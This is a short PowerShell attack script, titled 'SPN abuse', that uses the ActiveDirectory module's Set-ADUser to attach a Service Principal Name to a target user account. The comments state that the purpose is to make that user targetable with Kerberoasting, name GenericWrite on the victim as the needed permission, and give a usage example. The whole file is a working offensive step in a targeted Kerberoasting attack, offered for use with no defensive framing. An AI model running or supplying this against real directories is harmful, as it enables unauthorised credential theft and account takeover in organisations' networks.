#############################################
#  ADD SPN TO USER ACCOUNT (SPN ABUSE)      #
#############################################
# Requires:
# - ActiveDirectory PowerShell module
# - Permissions to modify user accounts (e.g., GenericWrite or higher on target user)
# - Domain-joined machine
#
# This script adds a Service Principal Name (SPN) to the specified user account.
# Adding an SPN allows the user to be targeted with Kerberoasting.
#
# Parameters:
# -UserIdentity : The AD user to modify (e.g., svc-sql)
# -ServicePrincipalName : The SPN string to add (e.g., MSSQLSvc/sql.srv.local:1433)
#

param(
    [Parameter(Mandatory=$true)]
    [string]$UserIdentity,

	[Parameter(Mandatory=$true)]
    [string]$ServicePrincipalName
)


# Ensure the AD module is available
if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    Write-Error "ActiveDirectory module not found. Please install RSAT tools."
    exit
}
Import-Module ActiveDirectory

Set-ADUser -Identity $UserIdentity -ServicePrincipalNames @{Add=$ServicePrincipalName}

# Usage:
# .\add_spn_for_kerberosting.ps1 -UserIdentity "svc-sql" -ServicePrincipalName "MSSQLSvc/sql.srv.local:1433"
